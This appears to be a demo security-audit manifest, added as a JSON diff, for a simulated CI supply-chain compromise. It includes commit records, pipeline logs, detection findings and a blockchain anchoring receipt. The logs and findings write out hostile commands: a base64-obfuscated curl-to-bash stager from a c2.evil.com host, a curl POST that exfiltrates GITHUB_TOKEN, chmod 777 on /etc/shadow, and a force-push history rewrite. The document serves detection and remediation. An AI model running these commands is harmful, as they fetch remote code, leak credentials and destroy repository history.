@@ -1,0 +1,231 @@
+{
+  "schema_version": "git-chain.v2.4.0-audit-manifest",
+  "generation_metadata": {
+    "generated_at": "2026-10-16T05:15:09.593516+00:00",
+    "framework": "Git-Chain DevSecOps Enterprise",
+    "compliance_target": "NIST SP 800-218 (SSDF) / SLSA Level 4",
+    "analyst_identity": "NavdeepNP (navdeepmalik077@gmail.com)"
+  },
+  "target_repository": {
+    "name": "NavdeepNP/git-chain-core",
+    "remote_url": "https://github.com/NavdeepNP/git-chain-core.git",
+    "branch": "refs/heads/main",
+    "scenario": "Supply Chain Infiltration (Poisoned Pipeline)",
+    "total_commits": 3,
+    "total_log_entries": 5
+  },
+  "git_commit_dag": [
+    {
+      "commit_hash": "41982b7c4a109842f91048b91823a019482b9a71",
+      "parents": [
+        "0000000000000000000000000000000000000000"
+      ],
+      "author": "NavdeepNP <navdeepmalik077@gmail.com>",
+      "timestamp": "2026-10-16 00:13:44 UTC",
+      "message": "refactor(network): optimize connection multiplexing",
+      "gpg_signed": true,
+      "diff_summary": "src/net/mux.py | +89 -12 lines"
+    },
+    {
+      "commit_hash": "8821094ba719284019284a01928471a8293b0198",
+      "parents": [
+        "41982b7c4a109842f91048b91823a019482b9a71"
+      ],
+      "author": "Unknown Contributor <shadow_dev@ghost-relay.net>",
+      "timestamp": "2026-10-16 02:13:44 UTC",
+      "message": "build(ci): speed up build cache and update runner script",
+      "gpg_signed": false,
+      "diff_summary": "scripts/build_ci.sh | +15 -1 lines (chmod 777 injected)"
+    },
+    {
+      "commit_hash": "f04928194a0293b84710928471a8293b019842a1",
+      "parents": [
+        "8821094ba719284019284a01928471a8293b0198"
+      ],
+      "author": "CI Runner <ci-admin@runner-node-04.internal>",
+      "timestamp": "2026-10-16 04:28:44 UTC",
+      "message": "fix(ci): override branch history git push --force",
+      "gpg_signed": false,
+      "diff_summary": "git push --force origin main | Destructive rewrite"
+    }
+  ],
+  "cicd_pipeline_logs": [
+    {
+      "step": 1,
+      "stage": "checkout",
+      "timestamp": "2026-10-16 04:28:44 UTC",
+      "command": "git checkout origin/main",
+      "output": "HEAD at f049281 (PR #42 by shadow_dev merged into NavdeepNP/git-chain-core)",
+      "exit_code": 0
+    },
+    {
+      "step": 2,
+      "stage": "setup-perms",
+      "timestamp": "2026-10-16 04:28:44 UTC",
+      "command": "chmod -R 777 /app/bin && chmod 777 /etc/shadow",
+      "output": "Permissions modified: rwxrwxrwx",
+      "exit_code": 0
+    },
+    {
+      "step": 3,
+      "stage": "build-step",
+      "timestamp": "2026-10-16 05:13:44 UTC",
+      "command": "echo 'Y3VybCAtcyBodHRwOi8vYzIuZXZpbC5jb20vc3RhZ2VyIHwgYmFzaA==' | base64 -d | sh",
+      "output": "[!] Connecting to remote stager... executing inline shell script",
+      "exit_code": 0
+    },
+    {
+      "step": 4,
+      "stage": "telemetry-exfil",
+      "timestamp": "2026-10-16 05:13:44 UTC",
+      "command": "curl -X POST https://api.blackhat-drop.net/leak -d GITHUB_TOKEN=$GH_SECRET_KEY",
+      "output": "HTTP/1.1 200 OK (Exfiltrated 256 bytes)",
+      "exit_code": 0
+    },
+    {
+      "step": 5,
+      "stage": "git-force-rebase",
+      "timestamp": "2026-10-16 05:13:44 UTC",
+      "command": "git rebase -f HEAD~2 && git push --force origin main",
+      "output": "Branch 'main' forced update f049281...8821094",
+      "exit_code": 0
+    }
+  ],
+  "ai_anomaly_engine": {
+    "scan_executed": true,
+    "total_findings": 6,
+    "verdict": "FLAGGED_FOR_MANUAL_REVIEW",
+    "findings": [
+      {
+        "rule_id": "SEC-AI-102",
+        "title": "Indiscriminate Privilege Elevation (chmod 777)",
+        "severity": "HIGH",
+        "confidence_score": 0.978,
+        "mitre_attack": "T1222.002 (Linux File Permissions)",
+        "line_number": 2,
+        "offending_payload": "chmod -R 777",
+        "threat_analysis": "Overly permissive world-writable permissions assigned to build assets or executables, opening backdoor vectors.",
+        "remediation_guidance": "Apply Principle of Least Privilege (PoLP). Restrict permissions to minimum necessary (e.g. 755 or 644)."
+      },
+      {
+        "rule_id": "SEC-AI-101",
+        "title": "Obfuscated Base64 Shell Pipe Execution",
+        "severity": "CRITICAL",
+        "confidence_score": 0.9698,
+        "mitre_attack": "T1059.004 (Unix Shell)",
+        "line_number": 3,
+        "offending_payload": "echo 'Y3VybCAtcyBodHRwOi8vYzIuZXZpbC5jb20vc3RhZ2VyIHwgYmFzaA==' | base64 -d | sh",
+        "threat_analysis": "Detected encoded payload decoded and piped directly into an active shell interpreter. Typical of C2 stagers.",
+        "remediation_guidance": "Block pipeline execution. Enforce static binary verification and restrict unapproved shell pipelining."
+      },
+      {
+        "rule_id": "SEC-AI-104",
+        "title": "Exfiltration of Pipeline Secrets / Environment Tokens",
+        "severity": "CRITICAL",
+        "confidence_score": 0.9683,
+        "mitre_attack": "T1552.001 (Credentials In Files/Env)",
+        "line_number": 4,
+        "offending_payload": "curl -X POST https://api.blackhat-drop.net/leak -d GITHUB_TOKEN",
+        "threat_analysis": "Outbound network transmission detected passing high-entropy environment credential tokens to external endpoint.",
+        "remediation_guidance": "Revoke exposed API tokens immediately. Implement runner egress filtering and secret masking."
+      },
+      {
+        "rule_id": "SEC-AI-103",
+        "title": "Unauthorized Git History Rewrite / Force Rebase",
+        "severity": "HIGH",
+        "confidence_score": 0.9739,
+        "mitre_attack": "T1565.001 (Stored Data Manipulation)",
+        "line_number": 5,
+        "offending_payload": "git rebase -f",
+        "threat_analysis": "Destructive Git command detected in CI script attempting non-fast-forward rewrite of commit lineage.",
+        "remediation_guidance": "Enforce strict branch protection rules on GitHub/GitLab; disable force-pushes on release branches."
+      },
+      {
+        "rule_id": "SEC-AI-102",
+        "title": "Indiscriminate Privilege Elevation (chmod 777) (In Commit 8821094)",
+        "severity": "HIGH",
+        "confidence_score": 0.9863,
+        "mitre_attack": "T1222.002 (Linux File Permissions)",
+        "line_number": 1,
+        "offending_payload": "chmod 777",
+        "threat_analysis": "Commit 'build(ci): speed up build cache and update runner script' introduced dangerous pattern. Author: Unknown Contributor <shadow_dev@ghost-relay.net>",
+        "remediation_guidance": "Apply Principle of Least Privilege (PoLP). Restrict permissions to minimum necessary (e.g. 755 or 644)."
+      },
+      {
+        "rule_id": "SEC-AI-103",
+        "title": "Unauthorized Git History Rewrite / Force Rebase (In Commit f049281)",
+        "severity": "HIGH",
+        "confidence_score": 0.9558,
+        "mitre_attack": "T1565.001 (Stored Data Manipulation)",
+        "line_number": 1,
+        "offending_payload": "git push --force",
+        "threat_analysis": "Commit 'fix(ci): override branch history git push --force' introduced dangerous pattern. Author: CI Runner <ci-admin@runner-node-04.internal>",
+        "remediation_guidance": "Enforce strict branch protection rules on GitHub/GitLab; disable force-pushes on release branches."
+      }
+    ]
+  },
+  "cryptographic_anchoring": {
+    "merkle_root": "0x05068f3ed1fa77d0fa28882aa2ec8ea0bd088fa8d2f91628010d0b34f2708472",
+    "total_leaf_count": 8,
+    "leaf_hashes": [
+      "0x9b2d7c971a7edc781722982a36356691dba163e85abf82433c6ac52d97c44c4f",
+      "0xae1b1ee54fadb005de61fba8f97f3dfd2952222fe68e73d3eb2cee92707c0c70",
+      "0x31e5b4bfdbece1bb5bcbf3b74a4b27ddebfa2d043104f019fc83340e33dd8a34",
+      "0xf45625030fda926ad573902027e3436f3ee2926a68c0fc956b447e279784a5e3",
+      "0x5d7e3af8183f4401a04fa1dd0b7db8af297cb6feb625acc7b6b7ce01d3d1fbbf",
+      "0x5e5a81bfb7c6088649832262e428c526704671f1b78c4d449c0d045956765f54",
+      "0x6d84cbba7de925b67bf5e744d9a580f8b507eceac792490c7568b7a0a2376656",
+      "0x4ba192b4924aae65df79a2fb9787d5cb64b47bae97d198f01515851ae552ec31"
+    ],
+    "sample_merkle_proof": [
+      {
+        "position": "right",
+        "sibling": "0xae1b1ee54fadb005de61fba8f97f3dfd2952222fe68e73d3eb2cee92707c0c70"
+      },
+      {
+        "position": "right",
+        "sibling": "0xcef4b47402dec2288cd3d03bd586146a23ad5122291cb639211f5bae63c69894"
+      },
+      {
+        "position": "right",
+        "sibling": "0xd9d29ca74c97159e951057f28bca13cba299742c78f9786d3d24f018eeaae655"
+      }
+    ]
+  },
+  "blockchain_receipt": {
+    "status": "0x1 (SUCCESS - MINED)",
+    "transaction_hash": "0x8430c1a3f459db03b24cadce9f971b6a01a7abc913201581c66785a393aa26c4",
+    "block_number": 21849233,
+    "network": "Ethereum Sepolia (ChainID: 11155111)",
+    "contract_address": "0x71C94824b278f2B5481B27fBE801e0d37e2A3dB4",
+    "from_address": "0xc7e9a2f9a037f6a5bf3beaea0038a7785687cfc7",
+    "anchored_merkle_root": "0x05068f3ed1fa77d0fa28882aa2ec8ea0bd088fa8d2f91628010d0b34f2708472",
+    "repository_digest": "0x0faa24fe8c6cd3118a95ab9a77ef28bbbbc490afc28c3ef7d9f430ffc7a44a54",
+    "gas_used": 48751,
+    "gas_limit": 65000,
+    "effective_gas_price": "24.01 Gwei",
+    "transaction_fee": "0.001171 ETH",
+    "confirmations": 12,
+    "block_timestamp": "2026-10-16T05:14:52Z",
+    "event_logs": [
+      {
+        "event": "CommitStateAnchored",
+        "signature": "CommitStateAnchored(bytes32,bytes32,address,uint256)",
+        "topic0": "0xaac0db5e06b4db7fea691a15629e78069129b2169bb4edaa23aab44f6e49c595",
+        "topics": [
+          "0xaac0db5e06b4db7fea691a15629e78069129b2169bb4edaa23aab44f6e49c595",
+          "0x05068f3ed1fa77d0fa28882aa2ec8ea0bd088fa8d2f91628010d0b34f2708472",
+          "0x0faa24fe8c6cd3118a95ab9a77ef28bbbbc490afc28c3ef7d9f430ffc7a44a54"
+        ],
+        "data": "0x000000000000000000000000c7e9a2f9a037f6a5bf3beaea0038a7785687cfc7"
+      }
+    ],
+    "etherscan_url": "https://sepolia.etherscan.io/tx/0x8430c1a3f459db03b24cadce9f971b6a01a7abc913201581c66785a393aa26c4"
+  },
+  "tamper_evident_seal": {
+    "algorithm": "SHA-256",
+    "digest": "0x6b77cae7c22b0b5e7096f14be41672614db91dab2cd53a83e1f201034ce79ec9",
+    "signature": "0x1fc1dd60e197a2324f2370948d58cb506eeb27377509b0a36c39757aa69c88f2dfe068984773a64eace9dabec03b41b857bec97c904d8cf74f2ee26e1385eed9",
+    "verification_status": "AUTHENTIC"
+  }
+}
